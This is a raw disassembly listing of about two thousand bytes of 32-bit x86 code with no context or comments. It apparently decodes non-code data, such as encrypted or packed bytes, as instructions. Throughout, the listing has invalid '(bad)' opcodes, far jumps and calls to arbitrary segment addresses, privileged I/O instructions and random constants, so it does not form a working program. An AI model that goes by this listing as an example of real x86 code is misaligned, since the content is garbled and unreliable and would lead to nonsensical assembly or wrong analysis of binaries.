  40fd96:	add    DWORD PTR [ebx+0x21],esp
  40fd99:	pop    ecx
  40fd9a:	add    esp,esp
  40fd9c:	add    eax,0x21963079
  40fda1:	repz in al,dx
  40fda3:	sbb    edx,ebp
  40fda5:	or     al,0x54
  40fda7:	mov    eax,0x279a5188
  40fdac:	fdiv   QWORD PTR [ecx]
  40fdae:	mov    esp,0x4b8fbfac
  40fdb3:	or     eax,0x71d5de71
  40fdb8:	sub    dh,BYTE PTR [edi-0x5b]
  40fdbb:	mov    esi,0x196963d1
  40fdc0:	push   edx
  40fdc1:	call   0xdfc4:0x883ac4d9
  40fdc8:	or     eax,0x5c1e3053
  40fdcd:	lahf   
  40fdce:	push   0xabacfb24
  40fdd3:	jnp    0x40fdbf
  40fdd5:	add    DWORD PTR [edi+ebp*1+0xa2ae620],edx
  40fddc:	call   0xb999:0xb7075e5e
  40fde3:	fnstsw WORD PTR [edi-0x4ab9bd1c]
  40fde9:	cmp    DWORD PTR [ebx],ebx
  40fdeb:	cmp    bh,BYTE PTR ds:0x723b4ac3
  40fdf1:	mov    eax,0x4e9ed4f8
  40fdf6:	icebp  
  40fdf7:	jmp    0x40fd81
  40fdf9:	mov    esp,0xf3e83a7f
  40fdfe:	mov    ?,ebx
  40fe00:	and    DWORD PTR [esi-0x408958ff],0xffffff86
  40fe07:	inc    ecx
  40fe08:	es push edi
  40fe0a:	jne    0x40fdc4
  40fe0c:	fs cmp eax,0xad2b20ce
  40fe12:	mov    esi,0xd23937f7
  40fe17:	mov    WORD PTR [ebp+0x53c2ee4],gs
  40fe1d:	js     0x40fe6c
  40fe1f:	cmp    bh,0xbe
  40fe22:	mov    ah,0x90
  40fe24:	fstp   QWORD PTR [esi]
  40fe26:	or     ecx,DWORD PTR [edx+0x5c]
  40fe29:	push   es
  40fe2a:	ss mov cl,bl
  40fe2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe2e:	sbb    esp,ebp
  40fe30:	xchg   DWORD PTR [ebx+0x65407aa7],edx
  40fe36:	push   ds
  40fe37:	lods   eax,DWORD PTR ds:[esi]
  40fe38:	mov    ds:0x666eeeca,al
  40fe3d:	loop   0x40fe05
  40fe3f:	call   0x9685:0xc3cb66aa
  40fe46:	addr16 dec ebp
  40fe48:	adc    dh,BYTE PTR [edi]
  40fe4a:	xor    ch,bh
  40fe4c:	mov    BYTE PTR [edi-0xb7458ce],bh
  40fe52:	int3   
  40fe53:	into   
  40fe54:	ret    
  40fe55:	pop    ss
  40fe56:	push   es
  40fe57:	mov    WORD PTR [esi-0x25c0e41],fs
  40fe5d:	js     0x40fe99
  40fe5f:	xchg   ecx,eax
  40fe60:	rol    DWORD PTR [ecx],1
  40fe62:	pop    ebx
  40fe63:	js     0x40fe42
  40fe65:	test   ebx,ecx
  40fe67:	les    ecx,FWORD PTR [ecx+0x34]
  40fe6a:	cmp    cl,BYTE PTR [ebx-0x25]
  40fe6d:	cld    
  40fe6e:	add    al,0xeb
  40fe70:	sbb    al,0xa4
  40fe72:	push   edi
  40fe73:	jnp    0x40fe03
  40fe75:	pushf  
  40fe76:	sbb    bl,bh
  40fe78:	or     BYTE PTR [eax+0x57972d52],cl
  40fe7e:	aad    0xb4
  40fe80:	(bad)  
  40fe81:	not    DWORD PTR [edx-0x536e0c32]
  40fe87:	adc    al,0x60
  40fe89:	jle    0x40fef5
  40fe8b:	and    BYTE PTR ds:0xe5436b76,bh
  40fe91:	adc    esi,0xffffffb8
  40fe94:	inc    eax
  40fe95:	enter  0x3c57,0x15
  40fe99:	test   BYTE PTR [eax-0x2],dl
  40fe9c:	adc    eax,0x5afde8d
  40fea1:	push   ebx
  40fea2:	or     eax,0x7f7efa9a
  40fea7:	or     BYTE PTR [eax],cl
  40fea9:	outs   dx,BYTE PTR ds:[esi]
  40feaa:	idiv   DWORD PTR [ebx-0x2c]
  40fead:	adc    eax,0xeac5d58f
  40feb2:	inc    esi
  40feb3:	pop    ecx
  40feb4:	xchg   esp,eax
  40feb5:	mov    bh,0x85
  40feb7:	(bad)  
  40feb8:	mov    edi,0x3f934198
  40febd:	das    
  40febe:	ror    DWORD PTR [ebp+0x73],cl
  40fec1:	cli    
  40fec2:	fwait
  40fec3:	and    eax,0x6417b05a
  40fec8:	outs   dx,DWORD PTR ds:[esi]
  40fec9:	(bad)  
  40feca:	mov    al,ds:0x4c75ab97
  40fecf:	and    ch,ch
  40fed1:	test   BYTE PTR [ebx+0x10fdca05],0x71
  40fed8:	mov    al,BYTE PTR [esi+eiz*2]
  40fedb:	repz retf 
  40fedd:	pop    eax
  40fede:	cld    
  40fedf:	xor    bl,BYTE PTR [ebx-0x26]
  40fee2:	adc    eax,0xaf2e66ca
  40fee7:	add    BYTE PTR [esi+edi*2+0x64048208],ch
  40feee:	adc    eax,0xf73e2c23
  40fef3:	or     BYTE PTR [ebp-0x545e39a0],dl
  40fef9:	clc    
  40fefa:	nop
  40fefb:	adc    al,BYTE PTR [eax]
  40fefd:	lock cmp al,0x0
  40ff00:	mov    bh,BYTE PTR [edx]
  40ff02:	push   ebx
  40ff03:	cdq    
  40ff04:	jl     0x40ff7d
  40ff06:	pop    ds
  40ff07:	inc    ebx
  40ff08:	mov    edi,0xc489a81
  40ff0d:	(bad)  
  40ff0e:	lds    edx,FWORD PTR [ecx+0x19c136d9]
  40ff14:	sti    
  40ff15:	leave  
  40ff16:	test   eax,0x8622e236
  40ff1b:	add    bl,BYTE PTR [ebp-0x7c1dec3a]
  40ff21:	inc    eax
  40ff22:	(bad)  
  40ff23:	lods   eax,DWORD PTR ss:[esi]
  40ff25:	jmp    0xa92:0xb4abd1ea
  40ff2c:	fild   WORD PTR [ecx]
  40ff2e:	leave  
  40ff2f:	out    dx,al
  40ff30:	cmc    
  40ff31:	adc    ebx,ebx
  40ff33:	and    DWORD PTR [ebx-0x3ca08855],0x1ad10798
  40ff3d:	jmp    0x729:0xe67f3e1d
  40ff44:	popf   
  40ff45:	mov    esi,0x9ffe5fc5
  40ff4a:	add    al,0x5c
  40ff4c:	(bad)  
  40ff4d:	inc    edi
  40ff4e:	(bad)  
  40ff4f:	ror    eax,cl
  40ff51:	push   0x504e84f8
  40ff56:	adc    DWORD PTR [eax-0x10],eax
  40ff59:	or     esp,DWORD PTR cs:[esi-0x2ea8db49]
  40ff60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff61:	mov    ?,WORD PTR [ebx+0x35]
  40ff64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff65:	mov    ecx,0x372ee25f
  40ff6a:	test   eax,0x4404c952
  40ff6f:	pop    es
  40ff70:	xor    al,0xa3
  40ff72:	push   ds
  40ff73:	inc    esi
  40ff74:	mov    ecx,0x6bd6a53b
  40ff79:	dec    esi
  40ff7a:	stos   BYTE PTR es:[edi],al
  40ff7b:	jg     0x40ff41
  40ff7d:	inc    eax
  40ff7e:	pop    esp
  40ff7f:	aaa    
  40ff80:	dec    edi
  40ff81:	mov    edi,0x2c8c3d1e
  40ff86:	inc    esi
  40ff87:	xor    BYTE PTR [esi],0x16
  40ff8a:	ret    
  40ff8b:	add    eax,0x3e4015ce
  40ff90:	sbb    DWORD PTR [ecx+0xefe710a],edx
  40ff96:	scas   al,BYTE PTR es:[edi]
  40ff97:	pop    ebx
  40ff98:	or     DWORD PTR [edi],ebx
  40ff9a:	test   DWORD PTR [ebx],eax
  40ff9c:	lds    ebx,FWORD PTR [ebp+eax*1+0x55]
  40ffa0:	sbb    al,0xdf
  40ffa2:	les    eax,FWORD PTR [esi-0x415039e4]
  40ffa8:	sub    esi,DWORD PTR [esi]
  40ffaa:	data16 jecxz 0x40ff53
  40ffad:	arpl   WORD PTR [ecx-0x49c63609],ax
  40ffb3:	jne    0x40fff9
  40ffb5:	fist   DWORD PTR [ecx-0x3]
  40ffb8:	into   
  40ffb9:	das    
  40ffba:	sbb    BYTE PTR [edi],ch
  40ffbc:	push   esi
  40ffbd:	pusha  
  40ffbe:	fwait
  40ffbf:	push   ebp
  40ffc0:	mov    WORD PTR [edi+0x18],ss
  40ffc3:	cli    
  40ffc4:	mov    ds:0xaeec79d1,al
  40ffc9:	fisttp WORD PTR [edi+eax*4+0x29]
  40ffcd:	ss in  al,0x83
  40ffd0:	out    dx,al
  40ffd1:	cmp    eax,0x9e9e58b2
  40ffd6:	dec    ebx
  40ffd7:	dec    eax
  40ffd8:	outs   dx,BYTE PTR ds:[esi]
  40ffd9:	mov    ds:0x7fca1ff7,eax
  40ffde:	cmp    esi,DWORD PTR [ebx+0x74]
  40ffe1:	pop    ebp
  40ffe2:	sbb    eax,0x9fc8114a
  40ffe7:	cmp    al,dh
  40ffe9:	nop
  40ffea:	loope  0x41003f
  40ffec:	out    0x3f,al
  40ffee:	scas   eax,DWORD PTR es:[edi]
  40ffef:	xchg   ebx,eax
  40fff0:	mov    cl,0x7a
  40fff2:	je     0x40ffa8
  40fff4:	scas   al,BYTE PTR es:[edi]
  40fff5:	call   0xc893f361
  40fffa:	jl     0x410004
  40fffc:	(bad)  
  40fffd:	mov    edx,0x202a23a4
  410002:	nop
  410003:	jge    0x40ffb6
  410005:	imul   edi,DWORD PTR gs:[edx],0x61
  410009:	or     BYTE PTR [ecx],dl
  41000b:	fld    st(4)
  41000d:	mov    DWORD PTR [edx],ebp
  41000f:	outs   dx,DWORD PTR ds:[esi]
  410010:	dec    ecx
  410011:	(bad)  
  410012:	adc    esi,ecx
  410014:	pop    ebp
  410015:	or     BYTE PTR [ebp+0x226bc168],bl
  41001b:	cdq    
  41001c:	inc    edi
  41001d:	push   edx
  41001e:	or     bl,al
  410020:	cs retf 0xe69f
  410024:	cwde   
  410025:	push   es
  410026:	movsx  edi,WORD PTR [edi-0x43]
  41002a:	add    esp,ebx
  41002c:	inc    esi
  41002d:	xchg   ebx,eax
  41002e:	xor    DWORD PTR [edx+0x72139a1f],ecx
  410034:	imul   BYTE PTR [esi-0x7cbcf1c1]
  41003a:	test   DWORD PTR [ecx],eax
  41003c:	inc    ebx
  41003d:	mov    ebx,0xb4a9500f
  410042:	mov    BYTE PTR [edx+0x6a],dh
  410045:	mov    esp,0xbde08817
  41004a:	and    DWORD PTR [ecx+ebp*4+0x60cd90e8],eax
  410051:	inc    eax
  410052:	and    BYTE PTR [edx-0x7364ed49],dh
  410058:	push   0x48c87370
  41005d:	or     al,0x50
  41005f:	in     al,dx
  410060:	pusha  
  410061:	push   ss
  410062:	and    bh,BYTE PTR [edx+ecx*1-0x46833e0c]
  410069:	and    eax,0x6218575f
  41006e:	dec    ebx
  41006f:	and    ebp,DWORD PTR [esi]
  410071:	xor    edx,edx
  410073:	cld    
  410074:	cmp    bh,BYTE PTR [edx-0x370c5341]
  41007a:	ja     0x41003c
  41007c:	repz fadd st(6),st
  41007f:	push   cs
  410080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410081:	jns    0x410076
  410083:	pop    eax
  410084:	and    eax,0x9276ffbc
  410089:	mov    ah,0x35
  41008b:	jmp    0x8c5b35af
  410090:	mov    edx,ebx
  410092:	jg     0x410031
  410094:	dec    esi
  410095:	nop
  410096:	loope  0x410071
  410098:	scas   al,BYTE PTR es:[edi]
  410099:	push   ds
  41009a:	xor    BYTE PTR [ecx],0x73
  41009d:	fdiv   QWORD PTR [esi]
  41009f:	pop    ss
  4100a0:	cmp    ebp,edi
  4100a2:	jne    0x41009e
  4100a4:	leave  
  4100a5:	loope  0x4100b7
  4100a7:	jno    0x4100ae
  4100a9:	fwait
  4100aa:	pop    ds
  4100ab:	or     al,BYTE PTR [esi-0x47515d43]
  4100b1:	test   eax,0x1865ba8e
  4100b6:	lea    ebp,[ecx-0x79]
  4100b9:	retf   
  4100ba:	sub    dh,BYTE PTR [eax-0xe]
  4100bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100be:	scas   eax,DWORD PTR es:[edi]
  4100bf:	or     al,0x54
  4100c1:	xor    eax,0xc213d350
  4100c6:	xchg   ecx,eax
  4100c7:	and    al,0xbb
  4100c9:	fsubrp st(7),st
  4100cb:	test   al,0xf9
  4100cd:	fwait
  4100ce:	in     al,dx
  4100cf:	push   es
  4100d0:	and    eax,0xa2e67286
  4100d5:	pop    es
  4100d6:	push   esi
  4100d7:	gs mov bl,0x9c
  4100da:	cmc    
  4100db:	mov    esi,0x10eb59
  4100e0:	aam    0x9e
  4100e2:	jmp    0x4100ff
  4100e4:	enter  0xce8a,0x4f
  4100e8:	(bad)  
  4100e9:	jmp    0x41011a
  4100eb:	or     BYTE PTR [edi],0x37
  4100ee:	add    dl,ah
  4100f0:	jb     0x410144
  4100f2:	test   al,0xf0
  4100f4:	imul   edx,DWORD PTR [edx+0x1045faf0],0xa6a3f5ba
  4100fe:	xchg   DWORD PTR [esi-0x19c0c4b0],ebx
  410104:	(bad)  
  410105:	shl    DWORD PTR [ecx-0x53],1
  410108:	or     al,0xb6
  41010a:	push   ecx
  41010b:	or     bl,dl
  41010d:	imul   edx,DWORD PTR [esi],0xdf11e704
  410113:	rol    cl,cl
  410115:	push   0xffffff8f
  410117:	push   0x49
  410119:	into   
  41011a:	push   0xcc52df46
  41011f:	xchg   BYTE PTR [ebp-0x1c],ah
  410122:	pop    es
  410123:	push   eax
  410124:	sti    
  410125:	fmulp  st(0),st
  410127:	int    0xcd
  410129:	xor    DWORD PTR [edx-0x4b],esi
  41012c:	bound  edi,QWORD PTR [ebx-0xedb170b]
  410132:	std    
  410133:	shl    BYTE PTR [edi+ecx*8+0x42b02f15],1
  41013a:	cmp    edi,eax
  41013c:	ja     0x4100d3
  41013e:	and    al,0x96
  410140:	enter  0xdcca,0x1c
  410144:	jne    0x410145
  410146:	clc    
  410147:	cld    
  410148:	test   DWORD PTR [ebp-0x3c614d3b],edi
  41014e:	cmp    eax,0x2bb7fdbb
  410153:	fwait
  410154:	xchg   ebx,eax
  410155:	pop    es
  410156:	outs   dx,BYTE PTR ds:[esi]
  410157:	stos   BYTE PTR es:[edi],al
  410158:	cli    
  410159:	sub    BYTE PTR [ebp-0x59a72abb],bl
  41015f:	mov    ds:0xfc0e4f91,al
  410164:	cmp    bl,BYTE PTR [ebp+0x1fbdc11c]
  41016a:	(bad)  
  41016b:	mov    eax,ds:0x9337d956
  410170:	(bad)  
  410171:	not    DWORD PTR [esi+0x72632ad2]
  410177:	sbb    al,BYTE PTR [ebx+edi*8]
  41017a:	xchg   edx,eax
  41017b:	mov    cl,0x8f
  41017d:	xchg   DWORD PTR [edi-0x3d6ff8c0],esi
  410183:	jecxz  0x410151
  410185:	(bad)  
  410186:	out    0xce,al
  410188:	scas   al,BYTE PTR es:[edi]
  410189:	sub    esp,DWORD PTR [eax]
  41018b:	lea    edi,[esi+0x1f92014e]
  410191:	jp     0x4101cf
  410193:	mov    ch,BYTE PTR [edi-0x63]
  410196:	ret    
  410197:	add    ebx,0x4f
  41019a:	add    ecx,DWORD PTR [ebp+0xd]
  41019d:	mov    dl,0xff
  41019f:	(bad)  
  4101a1:	cwde   
  4101a2:	push   0xc5e5f19
  4101a7:	stc    
  4101a8:	mov    dl,0x47
  4101aa:	fcomi  st,st(0)
  4101ac:	jge    0x4101c4
  4101ae:	adc    al,0xa3
  4101b0:	push   cs
  4101b1:	fnstsw WORD PTR [edx-0x4eb17caa]
  4101b7:	test   DWORD PTR ds:0x6072d292,ebp
  4101bd:	dec    ebp
  4101be:	imul   ebx,DWORD PTR [ecx+ebp*4+0x4448960f],0xffffff84
  4101c6:	mov    dh,0x8
  4101c8:	sub    eax,0x3de7493
  4101cd:	and    esi,DWORD PTR [ebx+0x64]
  4101d0:	in     eax,0xc3
  4101d2:	ficomp WORD PTR [edx+0x508d18f6]
  4101d8:	ss push esp
  4101da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101db:	fwait
  4101dc:	mov    eax,ds:0xadd71e6a
  4101e1:	xor    al,0x65
  4101e3:	add    al,0xa7
  4101e5:	inc    ebp
  4101e6:	loope  0x4101ba
  4101e8:	push   esi
  4101e9:	adc    eax,0xe1e402cc
  4101ee:	xor    BYTE PTR [ebx],dh
  4101f0:	dec    esi
  4101f1:	jae    0x4101b9
  4101f3:	(bad)  
  4101f4:	mov    ecx,edi
  4101f6:	dec    esi
  4101f7:	pop    edi
  4101f8:	and    ebp,DWORD PTR [esi]
  4101fa:	dec    ebx
  4101fb:	mov    al,0x2
  4101fd:	hlt    
  4101fe:	mov    ch,BYTE PTR [edx]
  410200:	loop   0x41022f
  410202:	jmp    0x96c4:0x5b9c7818
  410209:	lahf   
  41020a:	xchg   edx,eax
  41020b:	sub    al,0x10
  41020d:	stos   BYTE PTR es:[edi],al
  41020e:	mov    WORD PTR [eax],es
  410210:	sub    dl,bl
  410212:	sub    bh,BYTE PTR [ecx]
  410214:	mov    al,ds:0xc4c332d2
  410219:	and    al,0xa6
  41021b:	scas   al,BYTE PTR es:[edi]
  41021c:	adc    ch,bl
  41021e:	outs   dx,BYTE PTR ds:[esi]
  41021f:	mov    edx,0x788df2c6
  410224:	push   eax
  410225:	repnz push ecx
  410227:	clc    
  410228:	jg     0x4101f8
  41022a:	xor    DWORD PTR [ebp+0x19],eax
  41022d:	sub    BYTE PTR [edx-0x127baede],cl
  410233:	loopne 0x41020c
  410235:	push   ebx
  410236:	push   0xf9ac3d8a
  41023b:	out    dx,eax
  41023c:	push   0x6b
  41023e:	push   esi
  41023f:	inc    eax
  410240:	jmp    0xb016777c
  410245:	pop    es
  410246:	and    DWORD PTR [esi-0x3353cccc],ebp
  41024c:	jne    0x41029e
  41024e:	mov    edx,0xe8223cfb
  410253:	mov    DWORD PTR [edi],ebx
  410255:	mov    esi,0xe69c2684
  41025a:	sbb    dh,BYTE PTR [ebp-0xdfa1cb4]
  410260:	or     al,0xb3
  410262:	pop    ecx
  410263:	jmp    0x3b53a61c
  410268:	sub    edx,DWORD PTR [edx+ecx*1]
  41026b:	push   ss
  41026c:	and    al,0xc5
  41026e:	push   ebx
  41026f:	ret    0xaee0
  410272:	jns    0x41028f
  410274:	jo     0x41029d
  410276:	outs   dx,BYTE PTR ds:[esi]
  410277:	addr16 sbb al,0x32
  41027a:	scas   al,BYTE PTR es:[edi]
  41027b:	sti    
  41027c:	test   eax,0x21c2001f
  410281:	push   0xffffff97
  410283:	cdq    
  410284:	add    dh,BYTE PTR [ebp+0x74]
  410287:	cmp    DWORD PTR [edi-0x26884754],0xffffff9d
  41028e:	xor    bh,bh
  410290:	xor    DWORD PTR [ebp+0x95592a0],esi
  410296:	bound  edx,QWORD PTR [edx]
  410298:	or     ch,bh
  41029a:	aaa    
  41029b:	rcr    dl,0x30
  41029e:	test   eax,0x58f27043
  4102a3:	stos   DWORD PTR es:[edi],eax
  4102a4:	xor    BYTE PTR [esi-0x273d53ef],ch
  4102aa:	test   BYTE PTR [ecx+0x4c],cl
  4102ad:	popf   
  4102ae:	xchg   esi,eax
  4102af:	jns    0x410319
  4102b1:	imul   esp,DWORD PTR [esi],0x1c
  4102b4:	add    dl,BYTE PTR [ebx]
  4102b6:	pop    ds
  4102b7:	les    ecx,FWORD PTR [ebp+0x4f]
  4102ba:	mov    eax,ds:0x3274ab0d
  4102bf:	inc    ebx
  4102c0:	jbe    0x410324
  4102c2:	mov    edi,esi
  4102c4:	cmp    eax,0xe7ba8c2e
  4102c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102ca:	cld    
  4102cb:	popf   
  4102cc:	int3   
  4102cd:	jg     0x4102b4
  4102cf:	cmp    DWORD PTR [ecx+0x44f61121],0x6dbda6b8
  4102d9:	repz ficom WORD PTR [edx+0x4dea0a48]
  4102e0:	jno    0x41027e
  4102e2:	aas    
  4102e3:	push   ss
  4102e4:	xchg   ebx,eax
  4102e5:	pop    esp
  4102e6:	cmp    eax,0x7c6fe80e
  4102eb:	pop    esi
  4102ec:	ret    0x1ef3
  4102ef:	or     eax,0x3bbfec6b
  4102f4:	mov    eax,0xff82891d
  4102f9:	and    BYTE PTR [esp+edx*8+0x7f5d29e],cl
  410300:	mov    bh,0x3c
  410302:	(bad)  
  410304:	mov    ds:0x213d96b4,eax
  410309:	pop    esi
  41030a:	imul   edi,DWORD PTR [ecx+0x4f3c17ca],0xdb8fe24d
  410314:	push   ebx
  410315:	push   ebx
  410316:	sub    al,0x72
  410318:	push   ds
  410319:	addr16 call 0xaa06341
  41031f:	in     al,0xf1
  410321:	aaa    
  410322:	js     0x410396
  410324:	ror    BYTE PTR [ecx-0x3d],1
  410327:	mov    ds:0xc8daeaf6,al
  41032c:	mov    ds:0xb0eb2359,eax
  410331:	test   DWORD PTR [esi-0x29cef06b],ebx
  410337:	stos   DWORD PTR es:[edi],eax
  410338:	(bad)  
  410339:	arpl   WORD PTR [ecx-0x2a],bx
  41033c:	dec    esp
  41033d:	sbb    eax,esi
  41033f:	pusha  
  410340:	addr16 jle 0x41036c
  410343:	cmp    ecx,DWORD PTR [eax-0x60499f89]
  410349:	fadd   st,st(7)
  41034b:	adc    dh,BYTE PTR [ecx]
  41034d:	sub    bh,BYTE PTR [ebx]
  41034f:	mov    ds:0xdfd4ce7d,eax
  410354:	test   BYTE PTR ds:0x37747ef9,al
  41035a:	into   
  41035b:	aam    0xab
  41035d:	loope  0x410381
  41035f:	sahf   
  410360:	fwait
  410361:	into   
  410362:	ret    
  410363:	rcr    DWORD PTR [edx-0x3f],0x8f
  410367:	data16 test al,0xfe
  41036a:	and    eax,0xb645ecd5
  41036f:	xchg   BYTE PTR [ebx],dl
  410371:	sbb    eax,0x6bcadc77
  410376:	mov    ebp,ecx
  410378:	int3   
  410379:	mov    edx,0xc20755ee
  41037e:	sub    dl,BYTE PTR [ecx]
  410380:	je     0x410336
  410382:	ss dec eax
  410384:	jge    0x41033f
  410386:	lock jl 0x41038a
  410389:	push   0x79a864f2
  41038e:	sti    
  41038f:	mov    ch,0x1a
  410391:	mov    bl,0x5e
  410393:	inc    esi
  410394:	inc    esp
  410395:	dec    edi
  410396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410397:	inc    edi
  410398:	aad    0xdc
  41039a:	stos   BYTE PTR es:[edi],al
  41039b:	push   ebp
  41039c:	xchg   esp,eax
  41039d:	dec    edi
  41039e:	adc    eax,0xf57c215e
  4103a3:	leave  
  4103a4:	popf   
  4103a5:	mov    esp,0xae58116f
  4103aa:	jge    0x4103d3
  4103ac:	add    ecx,edx
  4103ae:	fisttp WORD PTR [edx-0x22]
  4103b1:	xchg   esp,eax
  4103b2:	and    ch,BYTE PTR [ebp-0x7bb9abe7]
  4103b8:	mov    ebp,0xd8054065
  4103bd:	dec    ecx
  4103be:	inc    edi
  4103bf:	std    
  4103c0:	sbb    edx,DWORD PTR [ebx+ebp*8]
  4103c3:	jno    0x4103d9
  4103c5:	loop   0x410440
  4103c7:	or     al,BYTE PTR [eax-0x3b]
  4103ca:	and    al,0x5c
  4103cc:	loope  0x4103bf
  4103ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103cf:	rcr    cl,cl
  4103d1:	xor    DWORD PTR ds:0x4975a06a,ecx
  4103d7:	jo     0x4103bd
  4103d9:	test   BYTE PTR [ebx-0x3f1be2d8],dl
  4103df:	mov    DWORD PTR [edi+0x58],ecx
  4103e2:	aad    0x1a
  4103e4:	sti    
  4103e5:	push   ds
  4103e6:	mov    cl,0x27
  4103e8:	jge    0x4103dd
  4103ea:	(bad)  
  4103ec:	inc    DWORD PTR [esi-0x5b9c41a3]
  4103f2:	mov    fs,WORD PTR [esi]
  4103f4:	inc    edx
  4103f5:	jo     0x41041c
  4103f7:	sahf   
  4103f8:	add    dl,BYTE PTR [edi+0x195914ca]
  4103fe:	inc    ebx
  4103ff:	and    esp,DWORD PTR [eax+0x8561037]
  410405:	repz daa 
  410407:	cmp    esi,ebx
  410409:	dec    ecx
  41040a:	jae    0x410438
  41040c:	cmp    eax,0x11
  41040f:	stos   BYTE PTR es:[edi],al
  410410:	push   eax
  410411:	sub    DWORD PTR [edi+0x3148b66a],edi
  410417:	pushf  
  410418:	sub    eax,0xdc12d976
  41041d:	(bad)  
  41041e:	cli    
  41041f:	add    DWORD PTR [eax-0x693483bd],esi
  410425:	sbb    esi,DWORD PTR [eax+0x68]
  410428:	cmp    bl,bl
  41042a:	mul    DWORD PTR [ebx-0x1e]
  41042d:	mov    BYTE PTR [edx+ecx*1],0x8a
  410431:	or     edi,eax
  410433:	scas   eax,DWORD PTR es:[edi]
  410434:	cmp    edi,DWORD PTR [ecx+0x674cf3c9]
  41043a:	lock sti 
  41043c:	cmp    al,0xdf
  41043e:	cmp    al,0x9d
  410440:	call   0xf251be2
  410445:	inc    ebp
  410446:	les    ecx,FWORD PTR [ebx]
  410448:	or     al,0x4f
  41044a:	loopne 0x4104c1
  41044c:	xor    BYTE PTR [esi+ebp*4],0xa6
  410450:	int    0x1a
  410452:	sbb    DWORD PTR [edi-0x55],eax
  410455:	jo     0x410487
  410457:	sub    al,0x7b
  410459:	xor    eax,0xc3c3660
  41045e:	sub    eax,0x4b7adec
  410463:	scas   eax,DWORD PTR es:[edi]
  410464:	jg     0x410406
  410466:	adc    DWORD PTR [esp+edx*2-0x33],ecx
  41046a:	loopne 0x410453
  41046c:	test   BYTE PTR [edx+0x300b73ff],bl
  410472:	test   eax,0x728049cd
  410477:	mov    al,gs:0xf2e6b6b3
  41047d:	aad    0x7e
  41047f:	(bad)  
  410480:	xor    DWORD PTR [edi],edx
  410482:	das    
  410483:	fmul   st,st(2)
  410485:	imul   ebx,DWORD PTR [edx+0x5a6b852d],0xb6ab2e83
  41048f:	scas   al,BYTE PTR es:[edi]
  410490:	xlat   BYTE PTR ds:[ebx]
  410491:	(bad)  
  410492:	repnz xor eax,0xc8804f74
  410498:	loope  0x410464
  41049a:	and    dh,BYTE PTR [edx+ebp*2-0x248d56be]
  4104a1:	(bad)  
  4104a2:	ror    esp,1
  4104a4:	fs mov edx,0xedefa9ac
  4104aa:	dec    eax
  4104ab:	stc    
  4104ac:	mov    bh,0x74
  4104ae:	lahf   
  4104af:	(bad)  
  4104b0:	stos   BYTE PTR es:[edi],al
  4104b1:	inc    ecx
  4104b2:	inc    edi
  4104b3:	push   ds
  4104b4:	scas   eax,DWORD PTR es:[edi]
  4104b5:	lods   al,BYTE PTR ds:[esi]
  4104b6:	jmp    0x50275883
  4104bb:	adc    BYTE PTR [esi],bl
  4104bd:	push   eax
  4104be:	jecxz  0x410465
  4104c0:	jb     0x410460
  4104c2:	aas    
  4104c3:	xchg   esi,eax
  4104c4:	xchg   esi,eax
  4104c5:	fdiv   DWORD PTR [edx-0x1fb7e49c]
  4104cb:	push   ss
  4104cc:	adc    edi,esp
  4104ce:	es stos DWORD PTR es:[edi],eax
  4104d0:	xchg   edi,eax
  4104d1:	pop    esi
  4104d2:	scas   al,BYTE PTR es:[edi]
  4104d3:	lahf   
  4104d4:	std    
  4104d5:	jge    0x41046f
  4104d7:	pushf  
  4104d8:	jo     0x410483
  4104da:	adc    eax,0x70c1cabb
  4104df:	les    esi,FWORD PTR [esi+ecx*8]
  4104e2:	(bad)  
  4104e3:	sbb    DWORD PTR [ecx-0x13b0eb7a],esp
  4104e9:	xor    eax,0xb862d721
  4104ee:	inc    esi
  4104ef:	pop    ss
  4104f0:	out    dx,al
  4104f1:	retf   0x6164
  4104f4:	add    ebp,DWORD PTR [edx-0x43c68ad5]
  4104fa:	sbb    al,0x50
  4104fc:	mov    esi,0x807b9151
  410501:	stos   BYTE PTR es:[edi],al
  410502:	popa   
  410503:	dec    ebx
  410504:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410506:	push   edi
  410507:	xor    DWORD PTR [ebx-0x1b],ebx
  41050a:	fidivr WORD PTR [eax+0x12]
  41050d:	or     eax,0x182ac7fc
  410512:	mov    ecx,0x1171e9ed
  410517:	icebp  
  410518:	(bad)
  41051b:	sbb    BYTE PTR [edi+0x524164a3],dl
  410521:	nop
  410522:	pop    ds
  410523:	stc    
  410524:	mov    edi,0xba1b0b49
  410529:	out    dx,eax
  41052a:	xchg   BYTE PTR [ebp+0x3f210af7],dh
  410530:	int    0x9b
  410532:	pop    eax
  410533:	and    bl,ch
  410535:	cmc    
  410536:	mov    ebp,0x58c6a501
  41053b:	fist   WORD PTR fs:[esi]
  41053e:	pop    ds
  41053f:	jl     0x4104c2
  410541:	sbb    eax,0xa3c837db
  410546:	cmp    DWORD PTR [ebx],eax
  410548:	ins    DWORD PTR es:[edi],dx
  410549:	fdivr  QWORD PTR [ebp+0x4029cae3]
  41054f:	fs fmulp st(4),st
  410552:	inc    edi
  410553:	jne    0x4105a0
  410555:	dec    edx
  410556:	repz mov al,0x6d
  41055a:	dec    ebp
  41055b:	ja     0x4104eb
  41055d:	mov    ch,0xb2
  41055f:	add    eax,0xae65260f
  410564:	ret    
  410565:	cwde   
  410566:	mov    DWORD PTR [eax-0x30],esi
  410569:	fwait
  41056a:	stc    
  41056b:	xor    ebp,DWORD PTR [ebx+0x19]
  41056e:	jns    0x41051f
  410570:	pop    ecx
  410571:	pop    esi
  410572:	ss push ds
  410574:	pop    ebx
  410575:	mov    WORD PTR [ebx-0x46ae1281],cs
  41057b:	ins    BYTE PTR es:[edi],dx
  41057c:	push   eax
  41057d:	mov    ds:0x44aa1928,al
  410582:	xchg   ebp,eax
  410583:	sbb    ebp,DWORD PTR [eax+0x11]
  410586:	call   0xeda70abe
  41058b:	jle    0x4105e6
  41058d:	shr    BYTE PTR [ecx],0x52
  410590:	sahf   
  410591:	push   ebp
  410592:	push   0x4a
  410594:	mov    ds:0x7c698ffd,eax
  410599:	pop    ecx
  41059a:	mov    BYTE PTR ds:0x40cc25fa,dh
